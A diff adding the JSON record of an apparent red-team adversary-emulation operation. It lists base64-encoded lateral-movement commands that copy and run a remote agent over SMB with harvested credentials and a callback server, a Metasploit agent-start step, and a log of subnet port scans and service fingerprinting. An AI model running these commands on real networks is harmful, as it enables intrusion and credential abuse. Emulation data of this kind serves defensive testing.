+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 194,
+                            "payload": "smbExec.py"
+                        }
+                    ],
+                    "adversary_map_id": 113
+                },
+                {
+                    "id": 197,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNtYkV4ZWMuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifSAtLWNyZWQgI3tyZW1vdGUuaG9zdC5jcmVkZW50aWFsc30gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 197,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 113
+                },
+                {
+                    "id": 196,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNtYkV4ZWMuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifSAtLWNyZWQgI3tyZW1vdGUuaG9zdC5jcmVkZW50aWFsc30gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 196,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 113
+                },
+                {
+                    "id": 140,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 140,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 114
+                },
+                {
+                    "id": 190,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "cHl0aG9uMyAuL3NtYkV4ZWMucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tZG9tYWluX2NyZWQgI3tkb21haW4udXNlci5wYXNzd29yZH0gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 190,
+                            "payload": "smbExec.py"
+                        }
+                    ],
+                    "adversary_map_id": 115
+                },
+                {
+                    "id": 189,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "cHl0aG9uMyAuL3NtYkV4ZWMucHkgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tZG9tYWluX2NyZWQgI3tkb21haW4udXNlci5wYXNzd29yZH0gLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 189,
+                            "payload": "smbExec.py"
+                        }
+                    ],
+                    "adversary_map_id": 115
+                },
+                {
+                    "id": 192,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNtYkV4ZWMuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifSAtLWRvbWFpbl9jcmVkICN7ZG9tYWluLnVzZXIucGFzc3dvcmR9IC0tc2VydmVyICN7c2VydmVyfQ==",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 192,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 115
+                },
+                {
+                    "id": 191,
+                    "ability_id": "f874e67a-6f21-4dfc-9f94-da144ce6300d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat with Domain Creds (SMB)",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNtYkV4ZWMuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifSAtLWRvbWFpbl9jcmVkICN7ZG9tYWluLnVzZXIucGFzc3dvcmR9IC0tc2VydmVyICN7c2VydmVyfQ==",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 191,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 115
+                }
+            ]
+        }
+    },
+    "jitter": "1/2",
+    "steps": [
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.10",
+            "delegated": "2020-03-28 14:36:19.287562",
+            "run": "2020-03-28 14:36:20",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.11",
+            "delegated": "2020-03-28 14:36:19.287893",
+            "run": "2020-03-28 14:36:22",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.12",
+            "delegated": "2020-03-28 14:36:19.288234",
+            "run": "2020-03-28 14:36:23",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.100",
+            "delegated": "2020-03-28 14:36:19.288462",
+            "run": "2020-03-28 14:36:22",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.107",
+            "delegated": "2020-03-28 14:36:19.288676",
+            "run": "2020-03-28 14:36:23",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.108",
+            "delegated": "2020-03-28 14:36:19.288882",
+            "run": "2020-03-28 14:36:26",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.110",
+            "delegated": "2020-03-28 14:36:19.289215",
+            "run": "2020-03-28 14:36:25",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.111",
+            "delegated": "2020-03-28 14:36:19.289423",
+            "run": "2020-03-28 14:36:26",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.117",
+            "delegated": "2020-03-28 14:36:19.289624",
+            "run": "2020-03-28 14:36:27",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.118",
+            "delegated": "2020-03-28 14:36:19.289823",
+            "run": "2020-03-28 14:36:30",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "kali$root",
+            "command": "python3 ./scanner.py -i 192.168.1.120",
+            "delegated": "2020-03-28 14:36:19.290104",
+            "run": "2020-03-28 14:36:31",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.329311",
+            "run": "2020-03-28 14:36:40",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.329643",
+            "run": "2020-03-28 14:36:42",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.329865",
+            "run": "2020-03-28 14:36:44",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.330100",
+            "run": "2020-03-28 14:36:46",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.330490",
+            "run": "2020-03-28 14:36:48",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c ApacheStruts",
+            "delegated": "2020-03-28 14:36:40.330809",
+            "run": "2020-03-28 14:36:50",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Apache Struts",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.331248",
+            "run": "2020-03-28 14:36:52",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.331696",
+            "run": "2020-03-28 14:36:54",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.332139",
+            "run": "2020-03-28 14:36:56",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.332621",
+            "run": "2020-03-28 14:36:58",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.333044",
+            "run": "2020-03-28 14:37:00",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c telnet",
+            "delegated": "2020-03-28 14:36:40.333465",
+            "run": "2020-03-28 14:37:02",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint Telnet",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.333837",
+            "run": "2020-03-28 14:37:04",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.334355",
+            "run": "2020-03-28 14:37:05",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.334592",
+            "run": "2020-03-28 14:37:06",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.334894",
+            "run": "2020-03-28 14:37:07",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.335129",
+            "run": "2020-03-28 14:37:08",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c IIS",
+            "delegated": "2020-03-28 14:36:40.335439",
+            "run": "2020-03-28 14:37:09",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint IIS",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.335648",
+            "run": "2020-03-28 14:37:10",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.335850",
+            "run": "2020-03-28 14:37:12",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.336048",
+            "run": "2020-03-28 14:37:14",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.336375",
+            "run": "2020-03-28 14:37:16",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.336625",
+            "run": "2020-03-28 14:37:18",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c ThinkPHP",
+            "delegated": "2020-03-28 14:36:40.336775",
+            "run": "2020-03-28 14:37:20",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint ThinkPHP",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.336915",
+            "run": "2020-03-28 14:37:22",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.337050",
+            "run": "2020-03-28 14:37:24",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.337274",
+            "run": "2020-03-28 14:37:26",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.337525",
+            "run": "2020-03-28 14:37:28",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.337746",
+            "run": "2020-03-28 14:37:30",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c Trendnet",
+            "delegated": "2020-03-28 14:36:40.337892",
+            "run": "2020-03-28 14:37:32",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Scan Host to Fingerprint Trendnet Cameras",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.10:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338028",
+            "run": "2020-03-28 14:37:34",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.100:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338196",
+            "run": "2020-03-28 14:37:35",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.107:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338355",
+            "run": "2020-03-28 14:37:36",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.110:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338486",
+            "run": "2020-03-28 14:37:37",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.111:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338616",
+            "run": "2020-03-28 14:37:38",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "kali$root",
+            "command": "python3 ./fingerprint.py -s 192.168.1.117:445 -c smb",
+            "delegated": "2020-03-28 14:36:40.338745",
+            "run": "2020-03-28 14:37:39",
+            "status": 0,
